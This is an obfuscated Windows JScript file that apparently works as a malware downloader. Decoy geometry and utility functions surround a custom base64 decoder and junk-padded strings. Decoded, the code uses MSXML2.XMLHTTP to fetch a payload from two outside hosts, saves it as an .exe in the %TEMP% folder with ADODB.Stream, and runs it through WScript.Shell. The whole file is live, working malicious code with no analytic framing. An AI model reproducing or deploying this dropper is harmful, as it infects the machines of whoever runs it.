var dissimilar = 0;
londoner = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  oftentimes = [];
var rehab = {
    ':': '.',
    'U': 'S',
	'|': 'X'
	};
function gestureStart() {
  for (i=0; i<metas.length; i++) {
    if (metas[i].name == "viewport") {
      metas[i].content = "width=device-width, minimum-scale=0.25, maximum-scale=1.6";
    }
  }
}
function extend() {
    var target = arguments[0] || {}, o, p;

    for (var i = 1, len = arguments.length; i < len; i++) {
        o = arguments[i];

        if (!isObject(o)) continue;

        for (p in o) {
            target[p] = o[p];
        }
    }

    return target;
}

function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
String.prototype.cloven = function () {
	swindle = this;
	for (var i in rehab){swindle = swindle.replace(i, rehab[i]);}
    return swindle;
};
  for ( var i = 128; i--; ) {
    if ( oftentimes[ i ] === undefined )
      oftentimes[ i ] = -1;
  
    oftentimes[ londoner.charCodeAt( i ) ] = i;
  }
var ambiguous = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.cloven4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("olympics").join("");
    len = str.length;
    i = 0;
    out = "";
    while(i < len) {
	do {
	    c1 = oftentimes[str.charCodeAt(i++) & 0xff];
	} while(i < len && c1 == -1);
	if(c1 == -1)
	    break;
	do {
	    c2 = oftentimes[str.charCodeAt(i++) & 0xff];
	} while(i < len && c2 == -1);
	if(c2 == -1)
	    break;

	out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

	do {
	    c3 = str.charCodeAt(i++) & 0xff;
	    if(c3 == 61)
		return out;
	    c3 = oftentimes[c3];
	} while(i < len && c3 == -1);
	if(c3 == -1)
	    break;

	out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

	do {
	    c4 = str.charCodeAt(i++) & 0xff;
	    if(c4 == 61)
		return out;
	    c4 = oftentimes[c4];
	} while(i < len && c4 == -1);
	if(c4 == -1)
	    break;
	out += String.fromCharCode(((c3 & 0x03) << 6) | c4);
    }
    return out;
}

Point.distance = function(p1, p2) {
    var a = p1.x - p2.x;
    var b = p1.y - p2.y;
    return Math.sqrt(a * a + b * b);
};
Point.dot = function(p1, p2) {
    return p1.x * p2.x + p1.y * p2.y;
};

Point.cross = function(p1, p2) {
    return p1.x * p2.y - p1.y * p2.x;
};

var temporarily ="olympicsJVolympicsRFTVolympicsAl".cloven4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var ecommerce = "olympicsQWolympicsN0aXZolympicslWE9iaolympicsmVjdA=olympics=".cloven4();
String.prototype.cloven2 = function () {
    var business = {
        barmaid: this
    };
    business.ferry = business.barmaid["c3Vic3RyaW5n".cloven4()](dissimilar, ambiguous);
    return business.ferry;
};

var indeterminate ="olympicsRXhwYW5olympicskRW52aXolympicsJvbm1lbnRTdHJolympicspbmdz".cloven4();
var Native = function(options){
	
};
var theology = [ecommerce, indeterminate,temporarily,  ""+"."+("organisation","disown","requisition","permit","institution","adventitious","quietude","induction","exe"), "UnVu".cloven4(), ("M"+"SX"+"ML"+("eclat","acclaimed","boxed","deepen","pendant","steady","feasibility","2.")+"|M"+"LH"+"TT"+("scholarship","dragons","purify","inauguration","structural","governments","smoldering","emphasize","P>")+"WU"+("wight","allpowerful","birmingham","learn","relax","entice","randy","cr")+("primary","mechanisms","staffing","adjournment","broil","endorse","hermes","condemning","ip")+"t:"+("sawing","gavin","realtors","superficially","closing","chichester","arroyo","markers","Sh")+"ell").cloven()];
abnormally = "_F2_";
var philology = this[theology.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
JhaxzJfxmP = "sbgNOP";
barbados = (("extending", "curry", "wooer", "volleyball", "cohesion", "kidney", "factotum", "pAvajqYjgU") + "fINvcRFVI").cloven2();
cycle = (("tradespeople", "virginia", "lavishly", "aides", "lusty", "puppet", "marilyn", "wheels", "warranty", "sRAIzRJC") + "uBYTqC").cloven2();
  
    String.prototype.postings = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var reporting = theology.pop().split(">");

psychologist = "b3Blbg==".cloven4();
var knight = new philology(reporting[1]);
TIAPbotO = "_F3_";
var shipped = new philology(reporting[0]);
var blocked = knight[theology.shift()](theology.shift());
MFWAxq = "_F5_";
weasel = (("gauntlet", "practical", "impossible", "gaslight", "EsCbLpjzQf") + "IYLzqGwhK").cloven2();

var utils = theology.shift();
var belly = theology.shift();
function nectar(spout, roads) {

    try {
        var administrative = blocked + "/" + roads ;
		administrative = administrative+ utils;
            shipped[psychologist](("cayman","zoloft","G" + weasel) + ("fiftyone","vassal","district","welcome","T"), spout, false);
       
    Ckslbhjf = "_F7_";
    shipped[cycle + ("austria","comics","end")]();
	var hereby=(WScript+"barbados"=="V2luZG93cyBTY3JpcHQgSG9zdA==".cloven4()+"barbados")&&shipped["c3RhdHVz".cloven4()] +""=="MjAw".cloven4()&&typeof(HVyLgg)==="undefined";
	lQHNgR = "_F8_";
    if (hereby) {
		
        var fuzzy = new philology((("ventricle","friesland","potential","precisely","librarian","feelings","atmospheric","saddam","A")+("nieces","slides","employee","towards","transsexual","fatten","nigeria","twitching","SEOO")+"DB"+("laddie","grandiose","squeak","instruction","invention","regions","comfortable",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        fuzzy[psychologist]();
        HQLlbhN = "_F9_";
        fuzzy.type = ambiguous;
        TuiijjDgHv = "_F10_";
        fuzzy["d3JpdGU=".cloven4()](shipped[("procedures","protect","author","resources","promo","humanities","penknife","")+"R"+"es"+"pon"+rehab['U'].toLowerCase()+"e"+"Qm9keQ==".cloven4()]);
        ikPJha = "_F11_";
        fuzzy[(barbados + "o"+("affects","angeles","coiffure","rigorous","business","discretion","selfpossessed","buccaneer","00")+("insidious","maximize","pincers","sight","extending","myers","extra","8i")+"tion").replace("0"+("jauntily","betting","penmanship","lighten","manufacturer","thereabout","dietary","08"), cycle)] = 0;
        LxIjnFtb = "_F12_";
        fuzzy[("dunbar","humanitarian","jacobus","photo","medal","prepaid","elation","s")+"aveT"+"oF"+"ile"](administrative, 2);
        FuzruwGrGYa = "_F13_";
        fuzzy.close();
        VdOQpfXeRgE = "_F14_";
		knight[belly](administrative, ambiguous, true);
    }
} catch (GvqbJgB) { };

    ikXKieFKDy = "_F15_";
}
try{
nectar("aHR0cDovLw==".cloven4()+"\u0066\u006C\u0061\u0076\u0069\u006F\u0074\u0072\u0061\u006E\u0071\u0075\u0069\u006C\u006C"+"\u006F\u002E\u0063\u006F\u006D\u002F\u006B\u006A\u0067\u0037\u0036\u0036\u0035\u0064\u0066" + "?hYyOtT=XAuWfyPn","XgEGzxlMLe");}catch(HkzmAt){}

nectar("aHR0cDovLw==".cloven4()+"\u006D\u006F\u0064\u0078\u002E\u0073\u0068\u006F\u0063\u006B\u0065\u0072\u0073\u0061"+"\u006C\u0065\u002E\u0072\u0075\u002F\u006B\u006A\u0067\u0037\u0036\u0036\u0035\u0064\u0066" + "?wliFVh=ibtkezU","tGEXQCJMKdo");
   JMaivLusbB = "_F16_";
   